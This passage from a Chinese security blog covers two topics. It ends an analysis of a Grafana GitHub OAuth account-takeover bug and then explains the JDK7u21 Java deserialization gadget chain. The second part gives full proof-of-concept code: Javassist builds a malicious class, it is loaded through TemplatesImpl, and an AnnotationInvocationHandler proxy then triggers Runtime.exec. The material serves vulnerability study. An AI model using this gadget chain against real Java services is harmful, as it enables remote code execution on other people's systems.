<p>token获取成功后，用其初始化oauth2 client，然后获取了GitHub账户的信息：</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103824138.png" alt="image-20230820103824138"></p>
<p>到这里，OAuth认证的步骤就走完了，接下来便是Grafana将Github账户添加到自己系统中的逻辑，也是漏洞产生的关键地方。</p>
<p>pkg&#x2F;api&#x2F;login_oauth.go:238 通过从GitHub获取的用户信息构建一个ExternalUser对象</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820105810832.png" alt="image-20230820105810832"></p>
<p>然后进入syncUser，pkg&#x2F;api&#x2F;login_oauth.go:317</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820110418904.png" alt="image-20230820110418904"></p>
<p>这里通过BUS机制调用用户的更新或者插入逻辑，具体方法在pkg&#x2F;services&#x2F;login&#x2F;loginservice&#x2F;loginservice.go:44</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820111125520.png" alt="image-20230820111125520"></p>
<p>继续到pkg&#x2F;services&#x2F;login&#x2F;authinfoservice&#x2F;service.go:181</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820111715061.png" alt="image-20230820111715061"></p>
<p>可以看到LookupByOneOf函数返回了系统中和我Github同名的用户，也就是说Grafana认为我的Github账号和系统中的那个账号是同一个用户，那么这样后续就是用我Github中的用户信息去更新系统中的原本账户，导致账户接管漏洞</p>
<p>如果再进一步跟踪代码的话，其实就是用GitHub的用户名作为models.User的Login字段，然后用Xorm框架去查找，由于系统中原本的账户的Login字段就是Username，就导致查询出来了原本的账户</p>
<p>pkg&#x2F;services&#x2F;login&#x2F;authinfoservice&#x2F;service.go:150</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820112437889.png" alt="image-20230820112437889"></p>
<h3 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/grafana/grafana/pull/52238/commits/41a2c694414feabef022ef49c84bff5909a70740">https://github.com/grafana/grafana/pull/52238/commits/41a2c694414feabef022ef49c84bff5909a70740</a></p>
<p>大概就是添加了一些字段，改变了用户的查找逻辑</p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Grafana</tag>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>JDK7u21反序列化Gadgets</title>
    <url>/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/</url>
    <content><![CDATA[<p>一开始是学习FastJson反序列化的POC，然后发现欠缺不少知识，遂来补一下，收获良多，总结下笔记</p>
<p>所谓JDK反序列化Gadgets就是不同于利用Apache-CommonsCollections这种外部库，而是只利用JDK自带的类所构造的</p>
<span id="more"></span>

<p>先下载并配置好<a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">JDK7u21</a></p>
<h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><p>为了理解POC构造过程，还需要学习一些前置知识，Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含 Java 类或接口，Javassist 就是一个用来 处理 Java 字节码的类库</p>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        System.out.println(Arrays.toString(byteCode));</span><br><span class="line"></span><br><span class="line">        cc.writeFile(<span class="string">&quot;D:/Evil/&quot;</span>);<span class="comment">//将字节码写到D:/Evil/</span></span><br><span class="line"></span><br><span class="line">        cc.toClass().newInstance();<span class="comment">//得到Evil类类对象，借助反射构建Evil对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将D:&#x2F;Evil&#x2F;Evil.calss拖入IDEA即可反编译，可以看见javassist动态构建出了如下类</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222150342279.png" alt="image-20200222150342279"></p>
<p>至于为什么要继承AbstractTranslet，和构造函数中写命令执行的payload就涉及到下面POC的构造，暂时只需要了解javassist的大概功能</p>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>之前参考网上分析文章的POC是从<a href="https://github.com/frohoff/ysoserial">ysoserial</a>中修改得来的，代码中使用了ysoserial的一些类，我修改了一下将POC核心部分单独提取出来方便理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="type">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要就是利用了<code>TemplatesImpl</code>，向其中的<code>_bytecodes</code>属性赋值了一个恶意类，最终该恶意类被实例化并且调用了构造函数中的命令执行payload。javassist在这里的作用呢其实主要就是构建这么一个恶意类，并且得到其字节码用以给<code>TemplatesImpl</code>相关属性赋值，所以可以自行编译一个恶意类并读入字节码来使用</p>
<p>但会发现这里其实反序列化<code>TemplatesImpl</code>后还需要调用<code>getOutputProperties()</code>方法才能触发，不过在FastJson中已经可以形成完整利用链</p>
<p>在<code>getOutputProperties()</code>函数下断点，跟踪一下执行过程</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222155450171.png"></p>
<p>强制进入该函数</p>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222155814347.png"></p>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160020838.png" alt="image-20200222160020838"></p>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</p>
<p>这里得到POC中两项属性的构造条件，即<code>_name</code>不能为null，<code>_class</code>为null，然后进入<code>defineTransletClasses()</code></p>
<p>其实最终的触发点就在380行<code>_class[_transletIndex].newInstance()</code>，<code>defineTransletClasses()</code>是对<code>_class</code>和<code>_transletIndex</code>赋值</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160124453.png" alt="image-20200222160124453"></p>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160514649.png" alt="image-20200222160514649"></p>
<p>代码比较长这里就直接复制出来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//_bytecodes不能为null</span></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">/*在JDK7u80这一段代码是不同的</span></span><br><span class="line"><span class="comment">                TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span></span><br><span class="line"><span class="comment">                所以为了兼容JDK7u80，_tfactory需要存在findClassLoader()方法，即TransformerFactoryImpl类*/</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//获取_bytecodes长度并创建_class数组，所以POC中将恶意类的字节码转换为一个二维字节数组，new byte[][]&#123;byteCode&#125;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            <span class="comment">//_bytecodes[0]即为恶意类的字节码，ClassLoader.defineClass将字节数组转换为类的一个实例类</span></span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//判断恶意类的父类，即必须为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>defineTransletClasses()</code>执行完以后，回到<code>getTransletInstance()</code>,此时<code>_class[_transletIndex]</code>已经为<code>Evil</code>类的一个类对象，调用<code>newInstance()</code>实例化<code>Evil</code>即可触发该类构造函数或者静态代码块中的代码</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160756476.png" alt="image-20200222160756476"></p>
<p>所以总结以上条件，便可理解<code>TemplatesImpl</code>的构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>



<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>以上POC是需要反序列化<code>TemplatesImpl</code>类并调用其<code>getOutputProperties()</code>方法才能触发，即可以放入FastJson的反序列化处，但若没有触发<code>getOutputProperties()</code>的点，就需要寻找其他手段</p>
<p>代理是为了在不改变目标对象方法的情况下对方法进行增强，比如，我们希望对方法的调用增加日志记录，或者对方法的调用进行拦截</p>
<p>假设有一个<code>Person</code>类实现了<code>IPerson</code>接口中的<code>say</code>方法，但现在要在<code>say</code>方法前后实现一些逻辑，那么借助动态代理实现如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Handler</span>(person);</span><br><span class="line">        <span class="comment">//Proxy.newProxyInstance会返回一个代理对象，第一个参数为类加载器，第二个参数为实际对象实现的接口，第三个即为我们构造的handler对象</span></span><br><span class="line">        <span class="type">IPerson</span> <span class="variable">iPerson</span> <span class="operator">=</span> (IPerson) Proxy.newProxyInstance(IPerson.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;IPerson.class&#125;, handler);</span><br><span class="line">        iPerson.say(<span class="string">&quot;Hello&quot;</span>);<span class="comment">//调用代理对象的say,即会调用传入的handler对象中的invoke，并传入方法对象和参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要被代理的对象实现的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IPerson</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(String sentence)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实际需要被代理的对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">IPerson</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(String sentence)</span> &#123;</span><br><span class="line">        System.out.println(sentence);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Handler对象,需要继承InvocationHandler，调用代理对象的方法时，实际会调用Handler的invoke方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    Handler(Object target)&#123;</span><br><span class="line">        <span class="built_in">this</span>.target=target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//proxy为代理对象，method为要调用的方法的Method对象，args为调用method时传入的参数</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am speaking&quot;</span>);</span><br><span class="line">        method.invoke(target, args);<span class="comment">//通过反射调用实际对象target的method方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;My word is over&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><code>AnnotationInvocationHandler</code>就是一个<code>InvocationHandler</code>的实现类，也在下面的POC中起到关键作用</p>
<p>先贴出整理好的POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装了之前对恶意TemplatesImpl类的构造</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getEvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="type">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        <span class="type">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(Demo.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] obj=serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

